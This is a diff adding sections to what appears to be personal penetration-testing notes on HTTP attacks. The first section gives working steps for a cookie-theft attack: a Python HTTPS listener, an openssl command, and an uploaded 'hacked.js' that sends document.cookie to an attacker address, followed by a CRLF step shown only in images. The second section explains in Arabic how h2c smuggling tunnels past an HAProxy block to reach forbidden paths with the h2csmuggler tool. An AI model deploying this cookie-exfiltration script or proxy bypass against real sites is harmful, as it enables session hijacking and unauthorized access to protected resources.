@@ -2645,17 +2645,72 @@ HTTP
 
 
 
+## 1 - create file **`https.py`** to make server **`https`** not **`http`**
+
+```
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import ssl
+
+httpd = HTTPServer(('0.0.0.0', 8002), BaseHTTPRequestHandler)
+
+# Create SSL context
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
+
+# Wrap the socket with the context
+httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
+
+httpd.serve_forever()
+
+```
+
+
+## first run 
+
+```
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname"
+```
+
+
+<img width="511" height="123" alt="image" src="https://github.com/user-attachments/assets/0c90d52e-7c1f-4ea5-af83-5690ead9667c" />
+
+
+## then run 
+
+```
+python3 https.py
+```
+
+
+## upload in website **`hacked.js`**
+
+
+```JS
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+       document.getElementById("demo").innerHTML = xhttp.responseText;
+    }
+};
+xhttp.open("GET", "https://IP_ADDREESS:8002/?c="+document.cookie, true);
+xhttp.send();
+
+```
+
+## visit it **`/static/uploads/hacked.js`**
+
+<img width="922" height="218" alt="image" src="https://github.com/user-attachments/assets/1a287dd6-1ebc-49fc-a75d-87dc1c03e568" />
+
+
+## now send request to `/static/text.js` and do **`CRLF`**
 
 
 
+<img width="1906" height="686" alt="image" src="https://github.com/user-attachments/assets/b5a10218-718d-41f0-96fa-7330f5030e8f" />
 
 
 
-
-
-
-
-
+<img width="1307" height="328" alt="image" src="https://github.com/user-attachments/assets/445ae38c-da12-4b39-89af-5bfb195c6220" />
 
 
 
@@ -2666,7 +2721,355 @@ HTTP
 
 
 
+<details>
+  <summary>h2c Smuggling</summary>
 
+
+تخيل عندنا 3 أشخاص
+==================
+
+```
+أنا (Attacker)
+      |
+      |
+   HAProxy
+      |
+      |
+ Backend Server
+```
+
+يعني أي Request أنا ببعته لازم يعدي على الـ Proxy الأول.
+
+* * * * *
+
+الـ Proxy شغال إزاي؟
+--------------------
+
+لو أنا طلبت:
+
+```
+GET /
+```
+
+الـ Proxy يقول:
+
+> تمام الصفحة دي مسموح بيها 👍
+
+ويبعتها للـ Backend.
+
+* * * * *
+
+لكن لو طلبت:
+
+```
+GET /private
+```
+
+الـ Proxy يقول:
+
+> لأ ❌
+
+ويرجعلي:
+
+```
+403 Forbidden
+```
+
+يبقى أنا **مش عارف أوصل للـ Backend مباشرة**.
+
+* * * * *
+
+طيب يعني إيه Upgrade؟
+=====================
+
+تخيل إنك بتكلم واحد بالعربي.
+
+وفجأة تقوله:
+
+> ينفع نكمل إنجليزي؟
+
+لو وافق يقول:
+
+> أوكي.
+
+ومن اللحظة دي الحوار كله بقى بالإنجليزي.
+
+* * * * *
+
+في HTTP نفس الفكرة.
+
+أول الاتصال بيبدأ:
+
+```
+HTTP/1.1
+```
+
+أنا أقول للسيرفر:
+
+> ينفع نكمل بـ HTTP/2؟
+
+وده بيكون بالهيدر:
+
+```
+Upgrade: h2c
+```
+
+
+
+
+* * * * *
+
+لو السيرفر وافق يرد:
+
+```
+101 Switching Protocols
+```
+
+يعني:
+
+> تمام هنكمل HTTP/2.
+
+
+
+
+<img width="925" height="762" alt="image" src="https://github.com/user-attachments/assets/56e3c1ea-df20-4c86-82b8-9e6a6fe64451" />
+
+
+
+* * * * *
+
+فين المشكلة؟
+============
+
+خلينا نرسمها.
+
+```
+أنا
+ |
+ |
+HAProxy
+ |
+ |
+Backend
+```
+
+أنا قلت للـ Proxy:
+
+> ابعت للسيرفر إني عايز Upgrade.
+
+الـ Proxy المفروض يعمل إيه؟
+
+المفروض يقول:
+
+> لا، أنا اللي هتعامل مع الـ Upgrade.
+
+لكن فيه proxys غبيه 
+
+تقول:
+
+> مش فاهم يعني إيه Upgrade.
+>
+> خد يا Backend.
+
+وتبعتله الرسالة.
+
+* * * * *
+
+الـ Backend يقول:
+
+> تمام.
+
+ويحول الاتصال لـ HTTP/2.
+
+* * * * *
+
+بعد كده يحصل إيه؟
+-----------------
+
+الـ Proxy يفكر:
+
+> طالما الاتصال اتغير لبروتوكول تاني...
+>
+> أنا مش هفتش أي حاجة بعد كده.
+
+ويبقى عامل زي ماسورة.
+
+يعني:
+
+```
+أنا
+ |
+ |
+==========
+Tunnel
+==========
+ |
+ |
+Backend
+```
+
+
+<img width="1381" height="761" alt="image" src="https://github.com/user-attachments/assets/8515b5cb-e99b-4321-9afd-400704bc99a4" />
+
+
+* * * * *
+
+يعني إيه Tunnel؟
+----------------
+
+تخيل فيه نفق.
+
+```
+أنا ---> نفق ----------> Backend
+```
+
+مفيش حد واقف في النص يفتش.
+
+* * * * *
+
+يبقى لو بعت
+-----------
+
+```
+GET /private
+```
+
+مين هيشوفه؟
+
+الـ Backend فقط.
+
+* * * * *
+
+الـ Proxy؟
+
+ولا يعرف عنه أي حاجة.
+
+* * * * *
+
+طب ليه قبل كده كان بيرجع 403؟
+=============================
+
+لأن:
+
+```
+أنا
+ |
+Proxy
+ |
+Backend
+```
+
+الـ Proxy كان بيقرأ:
+
+```
+GET /private
+```
+
+ويقول:
+
+> ممنوع.
+
+* * * * *
+
+لكن بعد الـ Upgrade:
+
+```
+أنا
+ |
+Tunnel
+ |
+Backend
+```
+
+الـ Proxy مبقاش بيقرأ أي حاجة.
+
+* * * * *
+
+طيب الأداة h2csmuggler بتعمل إيه؟
+=================================
+
+هي بتعمل 3 خطوات لوحدها.
+
+### أول خطوة
+
+تبعت:
+
+```
+GET /
+Upgrade: h2c
+```
+
+* * * * *
+
+السيرفر يقول:
+
+```
+101 Switching Protocols
+```
+
+* * * * *
+
+ثاني خطوة
+
+تفتح Tunnel.
+
+* * * * *
+
+ثالث خطوة
+
+تبعت:
+
+```
+GET /private
+```
+
+من جوه الـ Tunnel.
+
+* * * * *
+
+الـ Backend يرد:
+
+```
+200 OK
+```
+
+بدل:
+
+```
+403
+```
+
+* * * * *
+
+ليه استخدمنا `/` في الأول؟
+==========================
+
+عشان:
+
+```
+/
+```
+
+مسموح.
+
+فأعرف أفتح منه الـ Tunnel.
+
+* * * * *
+
+بعد ما الـ Tunnel اتفتح...
+
+أدخل براحتي على:
+
+```
+/private
+```
+
+
+
+
+
+  
+</details>
 
 
 
